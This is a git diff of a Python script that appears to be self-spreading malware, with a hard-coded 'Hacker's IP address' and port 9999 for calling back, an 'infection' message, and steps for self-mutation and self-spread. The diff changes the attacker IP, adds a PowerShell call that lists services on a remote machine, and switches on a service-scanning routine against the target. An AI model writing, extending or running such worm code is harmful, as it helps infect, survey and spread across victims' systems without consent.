@@ -11,7 +11,7 @@ import random
 import re
 
 # ----------- Variables -----------
-host = '192.168.118.129' #Hacker's IP address as a string
+host = '192.168.73.1' #Hacker's IP address as a string
 port = 9999
 target_os = None
 infection_message = "You've been infected!!"
@@ -20,21 +20,31 @@ timeout = 0.01
 start_port = 65435
 spread_counter = 0
 
-windows_services_lister_ps1 = """
-# Define the IP address or hostname of the remote machine
-$remoteComputer = "192.168.118.1"
+import subprocess
 
-# Get the list of services from the remote computer
-$services = Get-Service -ComputerName $remoteComputer
+windows_services_lister_ps1 = (
+    "# Define the IP address or hostname of the remote machine\n"
+    '$remoteComputer = "192.168.118.1"\n'
+    "\n"
+    "# Get the list of services from the remote computer\n"
+    '$services = Get-Service -ComputerName $remoteComputer\n'
+    "\n"
+    "# Print service details\n"
+    '$services | ForEach-Object {\n'
+    '    Write-Output "Service Name: $($_.Name)"\n'
+    '    Write-Output "Display Name: $($_.DisplayName)"\n'
+    '    Write-Output "Status: $($_.Status)"\n'
+    '    Write-Output "---------------------------"\n'
+    '}\n'
+)
 
-# Print service details
-$services | ForEach-Object {
-    Write-Output "Service Name: $($_.Name)"
-    Write-Output "Display Name: $($_.DisplayName)"
-    Write-Output "Status: $($_.Status)"
-    Write-Output "---------------------------"
-}
-"""
+# Call the subprocess
+process = subprocess.Popen(['powershell', '-Command', windows_services_lister_ps1],
+                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+stdout, stderr = process.communicate()
+
+print("Output:\n", stdout.decode())
+print("Errors:\n", stderr.decode())
 
 first_time_spread_data = r"""
 #
@@ -61,9 +71,11 @@ spread_counter = 1
 
 windows_services_lister_ps1 = (
     "# Define the IP address or hostname of the remote machine\n"
-    '$remoteComputer = "192.168.118.1"\n\n'
+    '$remoteComputer = "192.168.118.1"\n'
+    "\n"
     "# Get the list of services from the remote computer\n"
-    '$services = Get-Service -ComputerName $remoteComputer\n\n'
+    '$services = Get-Service -ComputerName $remoteComputer\n'
+    "\n"
     "# Print service details\n"
     '$services | ForEach-Object {\n'
     '    Write-Output "Service Name: $($_.Name)"\n'
@@ -890,7 +902,7 @@ get_user_info(s)
 # if target_os != "Windows":
 # find_hosts_on_network(s)
 # (4.4) See what services are running & whats ports are open.
-# find_running_services(s)
+find_running_services(s)
 
 # (5) Self Mutations && (6) Perform Self Spread
 if spread_counter > 0:
